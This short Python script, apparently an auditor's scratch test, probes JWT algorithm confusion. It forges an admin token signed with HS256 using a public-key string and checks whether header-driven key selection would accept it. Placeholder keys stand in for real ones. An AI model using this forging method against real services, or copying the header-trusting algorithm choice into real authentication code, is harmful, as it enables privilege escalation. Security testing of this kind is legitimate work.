import jwt

# Generate RS256 token but sign with HS256 using public key
public_key = "public_key_string"

# Simulate decode_token with HS256 instead of RS256
token = jwt.encode({"sub": "admin"}, key=public_key, algorithm="HS256")
print("Token signed with HS256 using public key:", token)

# Simulate decode_token where algorithm is taken from header
unverified_header = jwt.get_unverified_header(token)
algorithm = unverified_header.get("alg", "RS256")
print("Algorithm from header:", algorithm)

# decode_token takes algorithm from header and gets key for it
# If the header says HS256, it might get the wrong key or we might trick it.
# Let's look at `_get_key_for_algorithm`
def _get_key_for_algorithm(algorithm: str, is_private: bool = True) -> str:
    if algorithm.startswith("RS"):
        return "rsa_private" if is_private else "rsa_public"
    elif algorithm.startswith("ES"):
        return "es_private" if is_private else "es_public"
    return "jwt_secret"

key = _get_key_for_algorithm(algorithm, is_private=False)
print("Key used for decoding:", key)
try:
    payload = jwt.decode(token, key, algorithms=[algorithm])
    print("Payload:", payload)
except Exception as e:
    print("Error:", e)
